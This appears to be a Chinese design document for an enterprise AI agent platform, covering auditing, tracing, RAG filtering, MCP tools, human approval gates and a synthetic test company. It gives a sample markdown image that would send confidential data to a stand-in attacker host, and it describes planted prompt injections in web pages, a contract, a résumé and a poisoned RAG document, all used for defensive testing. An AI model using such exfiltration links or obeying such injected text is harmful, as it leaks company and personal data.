事件名：`login`、`demo_login`、`policy_decision`、`tool_call`、`retrieval`、`model_call`、`route_decision`、`proposal_created`、`proposal_approved`、`proposal_rejected`、`proposal_executed`、`export`、`outage_switch`、`budget_exceeded`、`break_glass`、`owner_job`、`audit_read`（安全审计员读日志，由 `GET /api/audit` 写），以及四个“人做的决定”各有自己的事件（问题记录 D-13）：`metric_signed` / `metric_published`（动作 `metrics.sign` / `metrics.publish`，财务负责人签核、发布指标）、`hr_screening`（动作 `hr.screen_candidate`，保存筛查证据）、`hr_decision`（动作 `hr.record_decision`，HR 记录人工决定）。这四个动作被拒绝时也用同一个事件，decision 为 `deny`。迁移 001 和 101 里的 CHECK 约束强制这个列表；`tests/audit/test_events.py` 检查 Python 列表、两个迁移和实际数据库三者一致。

💡 签核和人工决定以前混在 `policy_decision`、`tool_call` 里，审计员要从一堆策略判断里把“人做的决定”挑出来。单独的事件名让“谁签了哪个数字、谁对哪个候选人做了什么决定”一查就有，这正是 GDPR 第 22 条和指标签核要能回答的问题。

trace 表 `trace.spans`：`span_id, run_id, parent_id, name, kind（node|llm|tool|retrieval|policy）, user_id, dept, level, started_at, ended_at, status（running|ok|error）, attrs jsonb, input_text, output_text`；CHECK 约束禁止 L4 的 span 带任何文本。唯一的写入途径是 `trace.write_span(...)`（SECURITY DEFINER）：span 属于谁取自 `app.user_id`/`app.dept`，不由参数指定；span 开始时只插入元数据，结束时更新一次；它的身份和主人永远不变，级别只升不降，结束后就冻结；attrs 里出现凭据类字段名直接拒绝。`Span.set_attr`（Python 一侧，不是 `trace.write_span`）限制 attrs 每项的值不超过 4096 字节的 JSON、键不超过 64 个字符。

**脱敏只在 span 结束时做一次**，用 span 最终的级别：`default_masker` = 先 `scrub_secrets` 再 `mask_for_level`；L4 的文本一律丢弃；脱敏函数出错或导入失败时一个字也不存（记 `attrs.masking_failed`）。出错的 span 状态设为 `error`，只记异常的类名（`attrs.error_type`），然后把异常继续抛出。成功的 span 在结束时写入失败的话，只记日志（类名）不抛异常，这个 span 保持 `running`。

💡 为什么等到结束才脱敏：一个 span 可能开始时是 L2，中途查到了 L3 数据才升级。如果开始时就按 L2 存了输入，那段输入就是按低级别脱敏的，泄露了不该留下的内容。等到结束时按最终级别统一处理，就不会有这个问题。

谁能读：请求人读自己的 span（RLS：`user_id = core.cur_user() AND core.cur_clearance() > 0`，所以停用账号连自己的也看不到）；`trace.read_meta(run_id)` 给平台管理员（角色和 `role:platform_admin` 都要对上）看元数据，没有文本；`trace.dept_stats(since)` 给部门负责人（角色是 manager 或 ceo，并持有 `head:<自己的部门>`）看**本部门**的 span 计数。CEO 作为总裁办负责人，也只能看 exec 部门。

```python
class Tracer:
    def __init__(self, masker: Callable[[str, Level], str | None] | None = None)
    @asynccontextmanager
    async def span(self, name: str, *, kind: str, run_id: str, principal: Principal,
                   level: Level, parent_id: str | None = None, input: str | None = None) -> AsyncIterator[Span]
    # Span.span_id、Span.level、Span.set_output(text)、Span.set_attr(k, v)、Span.set_level(level)（比当前低的值被忽略）
tracer = Tracer()                                    # 进程默认实例
async def read_run(principal: Principal, run_id: str) -> list[dict]     # 只返回自己的 span；别人的运行返回 []
async def read_meta(principal: Principal, run_id: str) -> list[dict]    # 平台管理员；不含文本字段；其他人 PermissionError
async def dept_stats(principal: Principal, since: datetime) -> list[dict]   # 键：dept、kind、route（取自 attrs.route）、level、status、n
```

💡 **审计和 trace 为什么分开**：trace 是给工程师排查问题的，可以脱敏、可以过期删除；审计是给合规和安全看的，要回答“谁、以谁的身份、通过哪个 Agent、看了什么、谁批准的”，而且不能被篡改。如果把 trace 当审计用，能看 trace 的人就成了全公司权限最高的人（设计评审 二.11）。同样的道理，trace 的统计也按“负责人只看本部门”这一条规则给，CEO 不开特例：设计评审第五节的权限矩阵里，“trace 内容”这一行的 CEO 一栏就是“否”。

平台服务阶段已完成：`audit_read` 事件；`dept_stats` 至少 5 个人才展示（迁移 102）。
仍待处理（问题记录 D-04）：`trace.spans` 加上 `subject_ids`，支持 GDPR 删除个人数据。

## 10. RAG（B1）

两张表：
- `rag.documents`：doc_id、version、status（`current` 现行 | `superseded` 已被替代 | `draft` 草稿）、collection、title、source、source_uri、project_id、matter_id、created_at、content_hash、pipeline（embedder 和切块器版本，换模型就重新 embedding）、text（清除密钥后的全文），加标签列（`acl_groups` 不能为空）；
- `rag.chunks`：chunk_id、doc_id、version、ord、title、heading、text、source_uri、project_id、matter_id、embedding vector(384)、tsv（Postgres 的 tsvector：全文检索用的分词结果，不是 embedding 向量；由 title、heading、text 用 `to_tsvector('english')` 生成，中文不会分词），加从文档复制来的标签列、collection、status。

两张表都开 RLS。`embedding` 上建 HNSW 索引（余弦距离），`tsv` 和 `acl_groups` 上建 GIN 索引。

集合（collection）：`public`、`general`、`eng`、`sales`、`legal`、`legal_regs`、`finance`、`hr`、`exec`、`playbooks`。

```python
def ingest_document(conn_owner, doc: DocIn) -> str   # DocIn(doc_id, title, text, collection, source, label, …)
    # 级别 = max(按来源的默认级别, 内容检测结果) —— 规则 4；按标题切块，每块约 800 字符，重叠 120
async def retrieve(p: Principal, query: str, *, purpose: str, k: int = 8,
                   collections: Iterable[str] | None = None) -> RetrievalResult
    # RetrievalResult(hits: list[Hit], level: Level, filter: RagFilter)
    # Hit(chunk_id, doc_id, title, text, level, trust, collection, score, source_uri)
```

- 检索在 `principal_tx` 里执行。WHERE 条件来自 `policy.rag_filter`（集合、级别、可信度、状态），**同时**底层还有 RLS 兜底。
- 混合检索：向量相似度取前 30，全文检索 `ts_rank` 取前 30，用倒数排名融合（RRF，常数取 60）合并，最后取前 `k` 条（`k` 是 `retrieve` 的参数，默认 8）。
- 返回结果的 `level` = 命中切块里的最高级别（没有命中时是 L1），用来抬高会话的高水位。
- embedding 在本地计算（fastembed 或测试用的哈希向量），查询内容不会离开本机进程。

💡 这就是“**检索前过滤**”：过滤条件下推到数据库里执行，和检索在同一条 SQL 里完成，无权看的文档永远不会被返回。（细节：pgvector 的 HNSW 是近似索引，它先在索引里找出一批候选（默认 hnsw.ef_search = 40），再套用 WHERE 和 RLS 条件；条件很严时，返回的可能少于要的 30 条。pgvector 0.8 起可以打开 hnsw.iterative_scan 让索引继续往下找，但本项目 pgserver 0.1.4 自带的是 pgvector 0.6.2，没有这个选项，只能调大 hnsw.ef_search，或者靠混合检索里全文检索那一路补召回。这只影响召回，不影响安全。）如果在应用层先检索再过滤，前 k 名可能全被无权看的文档占满，用户就什么也拿不到（HNSW 加 WHERE 在条件很严时也会召回不足，只是不会泄露；靠全文检索那一路和调大 ef_search 缓解）；而且任何一处漏了过滤（重排、缓存、调试接口）就会泄露。

`corpai/embed`：`get_embedder() -> Embedder`，提供 `.embed(list[str]) -> list[list[float]]`，维度 384。
- `FakeEmbedder`：对小写后的单词和相邻词对做特征哈希，再做 L2 归一化。相关的文本向量也相近，所以测试有实际意义。
- `FastEmbedder`：用 `sentence-transformers/paraphrase-multilingual-MiniLM-L12-v2`，缓存目录 `.cache/fastembed`。这是个多语言模型，用中文提问也能检索英文文档。

## 11. MCP 服务器与工具客户端（B2）

每个数据领域一个 `MCPServer`：`crm`、`code`、`docs`、`finance`、`hris`、`legal`、`web`。每个都是一个 Starlette 应用（`streamable_http_app(stateless_http=True, json_response=True)`），挂在 API 的 `/mcp/<domain>` 下（端点是 `/mcp/<domain>/mcp`），也可以单独运行。FastAPI 启动时运行各服务器的 MCP session manager（MCP 协议层的连接管理，和本文的“会话”（thread）、“登录会话”都无关）。

每个工具处理函数都先执行：

```python
ctx_auth = await authenticate(ctx, domain="crm", tool="get_account")
# 1. 从 ctx.request_context.request.headers 取 Bearer 令牌
# 2. verify_tool_token(aud="mcp:crm")：令牌是给本服务器的、工具在 scope 里、用户仍在职（重新解析身份）
# 3. policy.tool_allowed(...) → 拒绝时抛 ToolDenied 并写审计
```

然后对具体资源调用 `policy.decide()`，在 `principal_tx` 里查询，返回统一格式的结果**信封**（envelope：数据外面再包一层，附上标签、被拒绝的行和被屏蔽的字段）：

```json
{"ok": true, "data": {...}, "label": {"level": 3, "dept": "sales", "trust": "internal", "sources": ["crm.account:A-0012"]},
 "denied": [], "masked_fields": []}
```

- `label.level` = max(返回的每一行的来源级别, `classify_text(序列化后的数据)`)。
- 被拒绝的行列在 `denied` 里（给出 id 和原因），不悄悄丢掉。
- 写操作工具从不直接写业务表，而是调用 `proposals.create(...)`，返回 `{"proposal_id": "...", "status": "pending", "tier": 3}`。

💡 信封里的 `label` 是关键：Agent 每调一次工具，运行时就用返回的级别抬高会话的高水位。这就是“前两轮是公开问题，第 3 步拉入 CRM 数据，从第 3 步起全部走 local”的实现方式。

工具清单（只读工具 / 写工具及其风险档（tier，和数据级别 L1–L4 无关））：

| 领域 | 只读 | 写（风险档） |
|---|---|---|
| crm | `search_accounts`、`get_account`、`list_opportunities`、`get_interactions` | `log_interaction`（2）、`update_opportunity_stage`（2）、`send_email`（3） |
| code | `search_tickets`、`get_ticket`、`list_ci_runs`、`get_project_status`、`search_code` | `create_ticket`（2）、`comment_ticket`（2） |
| docs | `search_docs`、`get_doc` | — |
| finance | `list_metrics`、`get_metric`、`query_ledger`、`list_invoices`、`reconcile` | `post_journal_entry`（3） |
| hris | `get_employee`、`headcount`、`list_requisitions`、`list_candidates`、`get_candidate` | `create_requisition`（2） |
| legal | `search_contracts`、`get_contract`、`contracts_expiring`、`get_clause_library`、`search_regulations` | `create_contract_draft`（2）、`send_contract`（3） |
| web | `search(company)`、`fetch(url)`（只允许白名单域名；模拟语料，可能含注入） | — |

**客户端** `corpai/mcp_client.py`：

```python
class McpClient:
    def __init__(self, base_url: str | None = None, *, asgi_app=None)   # 传 asgi_app 时走进程内 httpx2.ASGITransport（测试用）
    async def call(self, *, principal, agent, run_id, domain, tool, args) -> ToolEnvelope
        # 每次调用都新换一个工具令牌（scope 只含这一个工具），用带 Bearer 头的 httpx2.AsyncClient
        # 通过 streamable HTTP 打开 mcp.Client，调用工具，解析信封
```

**提议**（`ops.proposals`）：id、created_at、requester_id、agent、run_id、thread_id、domain、tool、tier、params（jsonb）、params_hash（规范序列化 JSON（canonical JSON）的 sha256）、summary、status（`pending|approved|rejected|executed|failed|expired`）、approver_id、decided_at、reason、result（jsonb）、expires_at。

```python
def create(...) -> Proposal
def approve(approver: Principal, proposal_id: str, *, params_hash: str, reason: str) -> Proposal
    # 先 can_approve()（风险档 3 要四眼；风险档 2 请求人自己确认即可）；哈希必须一致；然后 execute()
def reject(approver, proposal_id, *, reason) -> Proposal
def execute(proposal_id) -> Proposal   # 按 EXECUTORS[(domain, tool)] 找执行器写入模拟系统（表主人角色），写审计
```

模拟的对外系统：`ops.outbox`（“已发出”的邮件和合同），以及各业务表本身。

💡 **参数哈希为什么重要**：审批人在界面上看到的是真实参数（完整收件人、正文、金额），批准时把这些参数的哈希一起提交，执行时再核对一次。这样防住两类常见漏洞：一是界面只显示模型写的摘要，摘要和真实参数不一致；二是批准之后参数被偷偷改掉。

## 12. LangGraph 运行时（B3）

```python
@dataclass(frozen=True)
class Services:
    gateway: ModelGateway; mcp: McpClient; tracer: Tracer
@dataclass(frozen=True)
class RunContext:                      # 运行时 context：调用时以 context=... 传入；context_schema=RunContext
    principal: Principal; run_id: str; thread_id: str; agent: str; services: Services
    user_level: Level = Level.L1       # 用户可以手动调高级别，不能调低

def max_level(a: int, b: int) -> int: return max(a, b)
class BaseState(TypedDict, total=False):
    sensitivity_hwm: Annotated[int, max_level]       # reducer 取最大值：任何节点都只能把它往上抬
    events: Annotated[list[dict], operator.add]      # 给界面看的事件：线路标记、策略提示、引用

async def llm(rt: Runtime[RunContext], state, messages, *, purpose, **kw) -> ChatResult
async def call_tool(rt, state, domain, tool, args) -> tuple[ToolEnvelope, dict]   # （信封, 抬高 hwm 的 state 更新）
async def retrieve(rt, state, query, *, purpose, k=8) -> tuple[RetrievalResult, dict]
async def approval_gate(rt, proposal_id) -> dict      # interrupt({"type": "approval", "proposal_id": …})，返回恢复时的值
```

- 图的第一个节点设置 `sensitivity_hwm = max(classify_text(用户输入), ctx.user_level)`。每个辅助函数都返回一个抬高 hwm 的 state 更新；`llm()` 读 `state["sensitivity_hwm"]` 传给网关。没有任何东西能降低它，只有开新会话（新 thread）才会重置。
- checkpoint（图每执行一步后保存的 state 快照；等待审批时图会停下，批准后靠它从断点继续）：`AsyncPostgresSaver`，放在 schema `lg`（连接的 `search_path=lg`），启动时由表主人执行 `setup()`。超过 `config.checkpoint_ttl_days` 的 checkpoint 由 `python -m corpai prune` 清理。
- 会话归属：`ops.threads(thread_id, owner_id, agent, app, created_at)`；同一进程里每个会话一把锁，会话忙时新的请求返回 400；checkpoint 表开了行级安全，只能读写自己的会话。审批后恢复运行时，从目录重新解析**会话主人**的身份，传入新的 `RunContext`（而不是审批人的身份）。
- 路由（`agents/router.py`）：用代码，不用模型。界面选择一个应用（`qa`、`legal_review`、`report`、`sales_profile`、`hr_headcount`、`hr_screening`、`hr_candidates`）；路由检查这个用户能不能启动对应的 Agent（`policy.may_start`，依据 `config/agents.yaml`），然后构建对应的图。`MILESTONE_APPS` 把每个里程碑应用对应到它的模块（`corpai.agents.legal`、`.report`、`.sales`、`.hr`）；模块导出 `build_graph`（或 `build_<app>_graph`）和 `initial_state`。模块有了图，`router.app_ready(app)` 才为真，`/api/me` 只列出这样的应用。
- **用户手动调高的级别是下限，子 Agent 也一样**：每张图的第一个节点把高水位升到 `max(classify_text(输入), ctx.user_level)`；销售的联网子 Agent 把 `ctx.user_level` 作为抽取调用的 hwm 传给网关（高于 L1 时网关忽略 `public_only`，于是走本地）。如果升级之后紧接着的模型调用可能失败（例如 `hr_screening`），升级放在单独的节点里，先存进 checkpoint，调用失败时会话也不会停在低级别。
- `ChatRequest.public_only=True` 只由代码设置：发给模型的每个字段都和已发布的内容逐字节一致，而且 hwm 是 L1（销售联网子 Agent 的抽取）。
- 图可以有自己的人工等待类型（`hr_screening` 的 `{"type": "hr_decision", ...}`）。目前这样的运行状态是 `done`，`output.data.awaiting_decision = true`；决定接口用代码构造的值恢复它。
- **Rule of Two（三项最多占两项）**：每个节点用装饰器 `@node(caps={...})` 声明自己占了哪几项能力，取值范围是 `{"untrusted_input"（读不可信内容）, "sensitive_data"（接触敏感数据）, "external_action"（对外通信或改变状态）}`。`tests/security/test_rule_of_two.py` 遍历每张图，只要某条路径三项全占、中间又没有 `approval_gate`，测试就失败。

💡 **为什么用户身份放在运行时 context 而不是 state**：state 是节点之间传递、可能被模型输出影响的数据；context 是这次运行固定的环境，节点只能读不能写。身份放在 context 里，模型无论输出什么都改不了“以谁的身份”。

💡 **Rule of Two** 来自 Meta 的 Agents Rule of Two：读外部不可信内容、接触敏感数据、对外行动，这三项在一个会话里最多占两项；三项都要时，Agent 就不能自主运行，必须有人监督（Meta 的说法是人工审批或其他可靠的验证手段；本项目用 `approval_gate` 人工审批）。它的好处是结构性的，不依赖模型“识破”注入；但 Meta 也说明它不是完整方案，还要配合其他防线（本项目的权限、路由、DLP、审计）。

Agent 白名单在 `config/agents.yaml`：`agents:` 下每个 Agent 有 `description`、`apps`（服务哪些应用）、`purpose`（它用的 `rag_filter` 用途，可以是 null）、`start: {roles, depts}`（谁能启动）、`tools`（写成 `domain.tool`），以及可选的 `subagent_of`。共八个：`qa`、`legal_review`、`report`、`sales_profile`、`sales_web`（`sales_profile` 的子 Agent，只有 `web.search`/`web.fetch`）、`hr_headcount`、`hr_screening`、`hr_candidates`（D-14：员工、负责人和 CEO 都能启动；只有 `hris.list_requisitions`、`hris.list_candidates`、`hris.get_candidate`；只能看自己的 `req:<id>` 岗位的候选人，其余一律明确拒绝）。每个里程碑 Agent 在 YAML 注释里写了逐节点的接线说明（哪个节点持有哪个工具），由各图的 Rule of Two 测试保证，加载器不检查。用户的角色在 `roles` 里，或者部门在 `depts` 里，就能启动这个 Agent；`depts` 永远不放行运维角色和服务账号，服务账号什么 Agent 都不能启动。工具名写错的话，加载配置时就报错。

## 13. API（B3 搭骨架，各里程碑扩展）

| 方法 | 路径 | 说明 |
|---|---|---|
| GET | `/api/health` | `{ok, mode: fake|live, sim_today}` |
| GET | `/api/personas` | 演示登录的身份列表（`directory.list_personas`；只在 `CORPAI_DEMO_LOGIN=1` 时提供） |
| POST | `/api/auth/demo-login` | `{user_id}` → `tokens.issue_session` → 设置 cookie；写审计 `demo_login` |
| POST | `/api/auth/logout` | 用校验过的 cookie 里的 sid 和用户调用 `tokens.revoke_session(sid, user_id)` |
| GET | `/api/me` | 用户身份概况 + 可用的应用（`policy.apps_for`） |
| POST | `/api/runs` | `{app, input, thread_id?, user_level?}` → `{run_id, thread_id, status, output, events, pending_approval?}` |
| GET | `/api/runs/{run_id}/trace` | 只能看自己的运行 |
| GET | `/api/proposals?box=mine|to_approve` | 我的提议 / 待我审批 |
| POST | `/api/proposals/{id}/approve` | `{params_hash, reason}` → 执行，并恢复对应的会话 |
| POST | `/api/proposals/{id}/reject` | `{reason}` |
| GET | `/api/audit` | 只有安全审计员（`audit.read_log`） |
| GET/POST | `/api/admin/switches` | 平台管理员：`local_down`、`external_down`，经 `gateway.ops.read_switches()` / `set_switch(principal, name, on, reason)`（改动和 Python 一侧的拒绝写审计 `outage_switch`；开关名或理由不对直接抛 `ValueError`，不写审计；被 `ops.set_switch` 的 SQL 检查拒绝时变成 `PermissionError`，不写 deny 记录） |
| POST | `/v1/chat/completions` | OpenAI 兼容的网关接口（网关令牌），`corpai.gateway.openai_compat.router` |
| — | `/mcp/<domain>/mcp` | MCP 服务器 |
| GET | `/` | 界面（实时模式） |

各里程碑的路由写在 `corpai/api/routes_<area>.py`，由 `create_app()` 统一挂载。API 启动（lifespan）时装上应用连接池（`pg.install_app_pool`），并加载人名词典（§7）。

各里程碑的路由先检查调用者能不能启动对应的应用（不能就明确返回 403，并写审计），再以该应用的 Agent 身份通过 MCP 工具读取：

| 方法 | 路径 | 说明 |
|---|---|---|
| GET | `/api/legal/contracts` | 调用者能读的合同的结构化字段（RLS），不含正文 |
| GET | `/api/legal/reviews?contract_id=`、`/api/legal/reviews/{id}` | 已保存的审查结果；读不到的返回 404 |
| POST | `/api/legal/uploads` | `{text, filename}`（最多 20 万字符）→ `{upload_id}`；按用户存在内存里 2 小时，只有上传者能审查 |
| POST | `/api/reports/{run_id}/export` | `{thread_id}` → `{filename, content, sha256, level, domain, bytes}`；正文从调用者自己的 checkpoint 读回，不信任请求里的内容；水印级别取运行的级别；写审计 `export`。`GET` 加 `?thread_id=` 下载同一个文件 |
| GET | `/api/metrics`、`/api/metrics/board?period=`、`/api/metrics/{id}` | 指标列表和 `can {sign, publish, refresh, drafts}`；各指标可见的行，带状态和来源；单个值。平台角色一律 403 |
| POST | `/api/metrics/sign`、`/api/metrics/publish` | `{period, metric_ids}`；只有财务负责人；允许和拒绝都写 `metric_signed` / `metric_published` |
| POST | `/api/metrics/refresh` | `{period}`；只有财务负责人，且只在演示登录开启时；写 `policy_decision`（`metrics.refresh`） |
| GET | `/api/sales/accounts` | 调用者能读的客户 |
| GET | `/api/hr/candidates?app=&req_id=`、`/api/hr/candidates/{id}?app=` | 按岗位列候选人（明确列出拒绝）；单个候选人，简历标为不可信 |
| POST | `/api/hr/screenings/decision` | `{thread_id, candidate_id, decision: advance\|hold\|reject, reason}`：会话必须是调用者自己的、正在等这个候选人；以调用者身份 `record_decision`（角色和理由都必须有，写 `hr_decision`）；之后才恢复会话。理由不进图的 state |

## 14. 界面（B4）

静态文件放在 `ui/`，没有构建步骤，用**普通 script 标签**（不用 ES 模块，不用 `fetch` 读本地文件），这样直接双击打开 HTML 也能用。

- 文件：`ui/index.html`、`ui/css/app.css`、`ui/js/*.js`、`ui/fixtures/*.js`（每个 fixture 文件设置 `window.FIXTURES.<name> = {...}`）。
- 模式：用 `file:` 协议打开 → **演示模式**（读录制好的 fixture）；由 API 提供页面 → **实时模式**（调 `/api/...`）；也可以手动切到演示模式。
- 默认中文，可切换英文；共用文案在 `ui/js/i18n.js`，各里程碑的在 `ui/js/i18n_<x>.js`（`KB.lang.extend("<x>", {zh, en})`；同一个键只能定义一次，中英文的键必须一致）。
- 里程碑扩展点：每个里程碑有自己的 `view_<x>.js`、`i18n_<x>.js`、`demo_<x>.js` 和 `fixtures/<x>.js`（`legal`、`report`（另有 `view_metrics.js`）、`sales`、`hr`）。演示钩子 `KB.demo.register("<x>", {apps, findRun, routes, init})`；不管谁提供的录制，都要经过共用的启动检查、会话级别、用户级别和宕机开关；扩展路由必须有登录身份，不能覆盖共用路由。
- 页面：
  - 身份选择（12 个演示身份：6 个部门各一个员工、一个负责人 + 平台管理员 + 安全审计员）、按角色的首页；
  - 问答（显示 local/external 线路标记、高水位横幅“本会话已切换到本地模式”、引用来源）；
  - 审批收件箱（显示完整真实参数和参数哈希）；
  - 法务审查（`#/legal`）、管理层报告（`#/report`）、指标签核（`#/metrics`）、销售画像（`#/sales`）、HR 筛选（`#/hr`）、编制（`#/headcount`）、候选人（`#/candidates`）；
  - trace 查看、审计日志查看、管理员开关；
  - “同一个问题，不同的人问”对比页。
- 用 CSP meta 限制资源来源：`default-src 'self'; img-src 'self' data:; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' http://127.0.0.1:8000`。外部链接显示完整 URL，点击前要确认。

💡 `img-src 'self' data:` 禁止加载外部图片，用来堵一种隐蔽的数据外带：被注入的模型输出一个 `![](https://攻击者.com/?data=机密)`，浏览器一渲染就把数据发出去了。

💡 不用 ES 模块，是因为 Chrome、Edge 等浏览器把 `file://` 页面的来源当作 `null`：模块脚本必须通过 CORS 检查，于是被拦；`fetch` 也不支持 `file://` 地址。各浏览器细节不同，普通 script 标签在哪里都能用。用普通 script 标签加 `window.FIXTURES`，HTML 双击就能打开，不需要起任何服务器。

## 15. 模拟公司（A5）

用 `--seed`（默认 7）生成，结果完全确定。`python -m corpai synth [--seed N] [--small] [--write-company-doc]` 调用 `corpai.synth.run(seed: int = 7, small: bool = False) -> SynthReport`：以表主人身份，在一个事务里清空（`TRUNCATE … CASCADE`，凡是有外键指向这些表的表也一并清空；目前包括 `core.sessions`，所以每次 synth 都会让所有登录会话失效，还有 `eng.ticket_comments`）并重写各业务 schema、`core.users/memberships/grants` 和 `synth.planted/canaries`；再把文档语料和模拟网页写到 `settings().corpus_dir`；最后写一条 `owner_job` 审计（任务名 `synth`，详情里不放金丝雀和答案）。`synth.generate(seed, small) -> World` 是其中不做任何 I/O 的纯函数部分。然后 `python -m corpai ingest` 调用 `corpai.rag.ingest_corpus(corpus_dir) -> int`，把语料导入 RAG。`--small` 保留所有演示身份、埋入问题和金丝雀，只减少填充数据，供快速测试用。`--write-company-doc` 从 `corpai/synth/script.py` 重新生成 `docs/company.md`（有测试保证两者一致）。

- **公司剧本**（`corpai/synth/script.py`，同时渲染成 `docs/company.md`）：Kestrelbyte GmbH，柏林；产品 *FleetPilot*（物流车队路线规划 SaaS）；约 70 人；时间线是截至 2026-09-30 的 12 个月；客户分布在德国、荷兰、法国、波兰、奥地利、意大利、西班牙。
- **人员**：CEO + 幕僚长（总裁办）；销售 14 人；技术 32 人（CTO）；法务 4 人；财务 6 人（CFO）；HR 5 人；IT 3 人（平台管理员、安全审计员、IT 支持）；另有服务账号 `svc:ingest`、`svc:metrics`、`svc:eval`、`svc:executor`。
- **演示身份**（测试和演示共用）：`PERSONAS: dict[str, str]`（键 → user_id），在 `corpai/synth/personas.py`，同时存在 `core.users.persona_key`。共 14 个：
  - 各部门一个员工、一个负责人：`ceo` u0001、`exec_staff` u0002、`sales_head` u0010、`sales_staff` u0011、`eng_head`（CTO）u0020、`eng_staff` u0021、`legal_head` u0030、`legal_staff` u0031、`finance_head`（CFO）u0040、`finance_staff` u0041、`hr_head` u0050、`hr_staff` u0051；
  - 另加 `platform_admin` u0060、`auditor`（安全审计员）u0061。
  - 这些 id 不随 seed 变化。
- **授权**：只有一条演示授权 `G-0001`：`legal_staff` → `grant:crm:A-0003`，**2027-12-31 23:59:59 UTC** 到期（按真实时间判断，见 §3）。
- **各系统数据**：
  - CRM：约 40 个虚构客户，以及联系人、商机、互动记录、带折扣的报价；
  - 技术：5 个项目，阶段是 需求→立项→开发→测试→上线→运维；约 300 个工单、CI 运行记录、代码库文档、2 份 L4 安全漏洞报告；
  - 法务：约 40 份带结构化字段的合同、2 个诉讼案件、条款库、GDPR 条文库（带条款号的转述摘要）；
  - 财务：会计科目表、12 个月的分录、应收应付发票、各部门预算与实际；
  - HR：员工、薪酬（L4）、绩效（L4）、带预算的招聘需求、候选人和简历；`hr.screenings` 建好但是空的。
  - 额外的业务列：`crm.accounts.city/fleet_size`、`eng.projects.repo/summary`、`legal.contracts.processes_personal_data`、`fin.journal_entries.txn_id`（每行是一条分录明细，同一笔借贷平衡的交易共用一个 txn_id）、`fin.invoices.kind`（`subscription|services`）、`hr.requisitions.recruiter_id`。
- **历史数据（D-12）**：`hr.employees.left_on`（6 名已停用的前员工：5 人在这 12 个月内离职，分布在技术和销售部，1 人在此之前；最后一天之后不再发薪，离职日都是月末）。招聘需求记录当前状态开始的日期（`on_hold_on`、`filled_on`、`closed_on`，有 CHECK 保证和状态一致）。总账有期初银行余额和 B 轮融资到账。已成交的商机不会晚于 2026-09-30 成交。
- **编制人数（D-10）**：只有一个实现，`hr.headcount_by_dept(p_as_of date DEFAULT NULL)`（迁移 091）：按当天开始时在职的人计数（离职的人不算），少于 5 人的分组在 SQL 里就隐藏。`hris.headcount` 和 `corpai.hr.headcount_summary` 都调用它；`ops.hr_headcount()` 已删除。`hris.headcount` 返回 `{departments: [{dept, headcount: n 或 "<5"}], min_group}`，调用者看不到的部门逐个明确拒绝（HR 员工：全部拒绝；HR 负责人：全部可见）。
- **指标**：`attrition_pct` 是按部门、过去 12 个月的真实流失率，只取 `hr.employees`（最小分组 5）；`headcount` 和费用里的人数不含已离职的人；`open_requisitions` 和 `hiring_*` 用期末那天的状态；新增 `cash_balance`（报告日的银行余额，管理层可见）。
- **文档语料**：`corpus_dir/docs/<collection>/<doc_id>.md`（被替代的旧版本是 `<doc_id>.v<N>.md`），YAML 头部有 `doc_id, title, collection, source, level, dept, owner_id, acl_groups, trust, subject_ids, project_id, matter_id, version, status, source_uri`。完整规模下约 143 份文档、10 个集合，其中有一份已被替代的制度。全公司可见的页面（ACL 为 `all`，例如 HR 手册）放在 `general`。
- **模拟网页语料**：`corpus_dir/web/pages.jsonl`（字段 `url, domain, title, text, published_on, company_account_id, kind, injected`）：每个 CRM 客户的官网、新闻、融资页面，都在白名单内的虚构域名上；外加 3 个藏了提示注入的网页。
- **金丝雀**：6 个由 seed 派生的 `KB-CANARY-xxxxxxxx` 字符串，放在 7 个位置（合同里那个既在数据行里，也在对应的语料文件里）。所在位置：一条 CRM 互动记录、合同 C-0006、技术项目 P-01 的 README、一份案件备忘录、一份财务报表、一条 `hr.performance` 评语。埋了金丝雀的行和文档**一律是 L4，ACL 保留原样**。清单在 `synth.canaries(canary, location, level)`，location 写成 `'db:<表>:<主键>'` 或 `'file:<corpus_dir 下的路径>'`。
  💡 提到 L4，是因为 L4 按规定绝不会走 `external`，所以金丝雀一旦出现在外发内容里，就一定是真泄露。ACL 不变，能读这一行的还是原来那些人，演示和测试走的仍是正常的权限路径。
- **埋入的问题**（评测的标准答案，每个 seed 的 ref 都一样），存在 `synth.planted(kind, ref, expected jsonb, note)`：
  - `overdue_receivable`：A-0001（按 ARR 算最大的客户）应收款逾期；
  - `contract_expiring`：C-0003 在 2026-11-30 到期，自动续约，解约要提前 45 天通知；
  - `project_testing_delayed`：P-02 卡在测试阶段，而 CI 一直是红的；
  - `hiring_over_budget`：R-02 超预算约 13.7%；
  - `dept_budget_overrun`：销售部 2026 年第三季度超预算；
  - `missing_dpa_clause`：C-0005 缺少数据处理（DPA）条款；
  - `injected_web_pages`、`injected_contract`（C-0004）、`injected_resume`：带注入的网页、合同、简历；
  - `rag_poisoned_doc`：一份被“投毒”的 RAG 文档；
  - `counterfactual_pairs`：反事实简历对，只有姓名、性别、年龄不同，用于偏见测试。

  `synth.planted` 和 `synth.canaries` 只有表主人能读。

💡 `synth` 这个 schema 只有表主人能读，应用角色完全看不到。否则 Agent 就有可能“检索到标准答案”，评测就作弊了。

## 16. 各里程碑的纵向切片

| | 图 | 关键检查 |
|---|---|---|
| M1 | `agents/qa.py`：分级 → 检索（按部门限定；写给 AI 的段落被扣下，`_qa_guard.py`）→ 工具调用 → 回答 → 引用校验。每次运行只有一个线路事件（回答那次调用的线路，也是最严格的） | 公开问题走 `external`；内部问题走 `local`；不同身份问同一个问题，返回的文档不同；打开宕机开关后 L3 请求报错，`external` 出口为 0。测试集：金丝雀、混沌、红队、路由样例（`tests/security`），黄金问题集（`evals/qa`），路由鲁棒性（`evals/routing`） |
| M2 | `agents/legal/`：输入的 `mode` 决定走四条路之一，纯文本由固定的代码规则映射。**审查**：接收（不可信 + 敏感；库里的合同、粘贴的文本或本人上传的文件）→ 审查（没有任何工具；hwm 至少 L3；每条发现一个“已隔离，无任何效果”的提示），这条路永远不提交提议。**到期**：只用 SQL，不调模型。**起草**：代码拼好的文本原样提交 `create_contract_draft`（风险档 2）→ 审批。**发送**：律师单独发起的一次运行，参数由代码构造 → `legal.send_contract`（风险档 3，四眼）→ 审批。`initial_state` 每次清空本次运行的键，所以发送那次运行里没有合同正文 | 藏了注入的合同不会引发任何工具调用；“下月到期的合同”查询结果完全准确；C-0005 缺 DPA 被发现 |
